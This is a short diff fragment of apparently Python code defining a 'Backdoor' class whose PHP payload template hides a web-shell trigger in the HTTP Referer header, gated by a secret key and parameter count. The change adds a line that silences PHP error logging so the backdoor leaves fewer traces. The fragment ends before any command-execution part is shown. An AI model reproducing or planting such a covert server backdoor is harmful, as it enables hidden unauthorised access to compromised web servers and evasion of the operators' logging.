@@ -20,6 +20,7 @@ import base64
 
 class Backdoor:
 	payload_template = """
+ini_set('error_log', '/dev/null');
 parse_str($_SERVER['HTTP_REFERER'],$a);
 if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
 echo '<%%%END_KEY%%%>';
